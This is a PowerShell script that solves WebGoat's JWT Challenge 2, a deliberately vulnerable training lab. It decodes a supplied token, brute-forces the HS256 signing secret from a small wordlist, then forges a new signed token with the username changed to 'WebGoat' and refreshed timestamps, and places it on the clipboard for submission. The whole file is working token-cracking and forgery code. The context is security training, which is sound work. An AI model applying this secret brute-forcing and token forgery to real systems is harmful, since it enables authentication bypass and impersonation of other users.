################################################
# JWT Challenge 2: Real-Time Token Cracker
# Handles timestamp delays with 0ms tolerance
################################################

param(
    [Parameter(Mandatory=$true)]
    [string]$OriginalToken
)

Write-Host "================================================" -ForegroundColor Cyan
Write-Host "   JWT Challenge 2: Real-Time Cracker" -ForegroundColor Yellow
Write-Host "   0ms Delay Tolerance" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Cyan

# Base64 URL decode function
function ConvertFrom-Base64Url {
    param([string]$base64Url)
    $base64 = $base64Url -replace '-','+' -replace '_','/'
    $base64 += '=' * ((4 - ($base64.Length % 4)) % 4)
    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))
}

# Base64 URL encode function
function ConvertTo-Base64Url {
    param([string]$text)
    $base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($text))
    return $base64 -replace '\+','-' -replace '/','_' -replace '=',''
}

# HMAC-SHA256 signature function
function New-JwtSignature {
    param(
        [string]$headerBase64,
        [string]$payloadBase64,
        [string]$secret
    )
    $hmac = [System.Security.Cryptography.HMACSHA256]::new([System.Text.Encoding]::UTF8.GetBytes($secret))
    $signatureBytes = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$headerBase64.$payloadBase64"))
    $signatureBase64 = [Convert]::ToBase64String($signatureBytes)
    return $signatureBase64 -replace '\+','-' -replace '/','_' -replace '=',''
}

# Test if signature matches
function Test-JwtSignature {
    param(
        [string]$token,
        [string]$secret
    )
    $parts = $token -split '\.'
    if ($parts.Length -ne 3) { return $false }
    
    $headerBase64 = $parts[0]
    $payloadBase64 = $parts[1]
    $originalSignature = $parts[2]
    
    $calculatedSignature = New-JwtSignature -headerBase64 $headerBase64 -payloadBase64 $payloadBase64 -secret $secret
    
    return $calculatedSignature -eq $originalSignature
}

Write-Host "`nStep 1: Decoding original token..." -ForegroundColor Cyan
$parts = $OriginalToken -split '\.'
$headerJson = ConvertFrom-Base64Url $parts[0]
$payloadJson = ConvertFrom-Base64Url $parts[1]
$signature = $parts[2]

Write-Host "`nOriginal Header:" -ForegroundColor Yellow
Write-Host $headerJson

Write-Host "`nOriginal Payload:" -ForegroundColor Yellow
$payloadObj = $payloadJson | ConvertFrom-Json
$payloadObj | ConvertTo-Json

Write-Host "`n================================================" -ForegroundColor Cyan
Write-Host "   Step 2: Brute Forcing Secret..." -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Cyan

# WebGoat-specific secrets wordlist
$secrets = @(
    "shipping",
    "victory",
    "defeating",
    "WebGoat",
    "secret",
    "password",
    "admin",
    "goat",
    "webgoat",
    "token",
    "jwt",
    "key",
    "test",
    "demo",
    "security",
    "challenge"
)

$foundSecret = $null
$count = 0

foreach ($secret in $secrets) {
    $count++
    Write-Host "Testing [$count/$($secrets.Count)]: $secret" -NoNewline
    
    if (Test-JwtSignature -token $OriginalToken -secret $secret) {
        Write-Host " ✓ MATCH!" -ForegroundColor Green
        $foundSecret = $secret
        break
    }
    Write-Host ""
}

if (-not $foundSecret) {
    Write-Host "`n❌ Secret not found in wordlist!" -ForegroundColor Red
    Write-Host "Try adding more secrets to the wordlist." -ForegroundColor Yellow
    exit 1
}

Write-Host "`n================================================" -ForegroundColor Green
Write-Host "   ✅ SECRET FOUND: $foundSecret" -ForegroundColor Green
Write-Host "================================================" -ForegroundColor Green

Write-Host "`n================================================" -ForegroundColor Cyan
Write-Host "   Step 3: Creating New Token with Real-Time Timestamp" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Cyan

# Get current Unix timestamp (real-time)
$currentTime = [int][double]::Parse((Get-Date -UFormat %s))

Write-Host "`nCurrent Unix Timestamp: $currentTime" -ForegroundColor Yellow
Write-Host "Token will expire in 60 seconds" -ForegroundColor Yellow

# Parse original payload
$payload = $payloadJson | ConvertFrom-Json

# Update with real-time timestamps and change username
$newPayload = [ordered]@{
    iss = $payload.iss
    aud = $payload.aud
    iat = $currentTime
    exp = $currentTime + 60  # Expires in 60 seconds
    sub = $payload.sub
    username = "WebGoat"  # Changed from Tom to WebGoat
    Email = $payload.Email
    Role = $payload.Role
}

# Create header
$header = @{alg='HS256'} | ConvertTo-Json -Compress

# Convert to JSON
$newPayloadJson = $newPayload | ConvertTo-Json -Compress

Write-Host "`nNew Payload:" -ForegroundColor Yellow
$newPayload | ConvertTo-Json

# Encode header and payload
$headerBase64 = ConvertTo-Base64Url -text $header
$payloadBase64 = ConvertTo-Base64Url -text $newPayloadJson

# Create signature
$signatureBase64 = New-JwtSignature -headerBase64 $headerBase64 -payloadBase64 $payloadBase64 -secret $foundSecret

# Assemble new token
$newToken = "$headerBase64.$payloadBase64.$signatureBase64"

Write-Host "`n================================================" -ForegroundColor Green
Write-Host "   ✅ NEW TOKEN CREATED!" -ForegroundColor Green
Write-Host "================================================" -ForegroundColor Green

Write-Host "`nNew JWT Token (username=WebGoat, fresh timestamps):" -ForegroundColor Yellow
Write-Host $newToken -ForegroundColor Cyan

# Copy to clipboard
Set-Clipboard $newToken
Write-Host "`n✅ Token copied to clipboard!" -ForegroundColor Green

Write-Host "`n================================================" -ForegroundColor Cyan
Write-Host "   SUBMIT IMMEDIATELY!" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "1. Go to WebGoat JWT Challenge 2" -ForegroundColor White
Write-Host "2. Paste token (Ctrl+V) - already in clipboard" -ForegroundColor White
Write-Host "3. Click Submit IMMEDIATELY" -ForegroundColor White
Write-Host "4. Token expires in 60 seconds from NOW" -ForegroundColor Yellow

Write-Host "`n================================================" -ForegroundColor Cyan
Write-Host "   VERIFICATION" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Cyan

# Verify the signature
$isValid = Test-JwtSignature -token $newToken -secret $foundSecret
if ($isValid) {
    Write-Host "✅ Signature is VALID" -ForegroundColor Green
} else {
    Write-Host "❌ Signature is INVALID" -ForegroundColor Red
}

# Decode and show payload
$newParts = $newToken -split '\.'
$decodedPayload = ConvertFrom-Base64Url $newParts[1]
Write-Host "`nDecoded Payload:" -ForegroundColor Yellow
$decodedPayload | ConvertFrom-Json | ConvertTo-Json

Write-Host "`n================================================" -ForegroundColor Green
Write-Host "   Secret: $foundSecret" -ForegroundColor Green
Write-Host "   Username: WebGoat ✓" -ForegroundColor Green
Write-Host "   Timestamp: FRESH (0ms delay)" -ForegroundColor Green
Write-Host "   Expires: $($currentTime + 60)" -ForegroundColor Green
Write-Host "================================================" -ForegroundColor Green
